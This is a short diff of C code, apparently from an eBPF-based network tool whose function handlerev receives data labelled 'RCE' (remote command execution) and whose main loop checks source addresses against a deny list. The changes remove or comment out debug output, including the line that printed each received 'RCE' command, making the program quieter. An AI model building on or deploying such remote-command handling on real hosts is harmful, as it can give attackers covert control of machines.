@@ -76,7 +76,7 @@ char *handlerev(char dial[INET_ADDRSTRLEN]) {
     return recrce;
   }
   while (fgets(recrce, MAX_RCE_SIZE, fp) != NULL) {
-    printf("RCE: %s\n", recrce);
+    //printf("RCE: %s\n", recrce);
     return recrce;
   }
   // -- Hacky implementation --
@@ -196,10 +196,8 @@ int main(int argc, char **argv) {
     while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
       err = bpf_map_lookup_elem(fd, &jkey, &ret);
       if (err < 0) {
-        printf("-");
         continue;
       }
-      printf(".");
       ignore = 0;
       inet_ntop(AF_INET, &ret.saddr, saddrval, sizeof(saddrval));
       for (int i = 0; i < cfg.denyc; i++) {
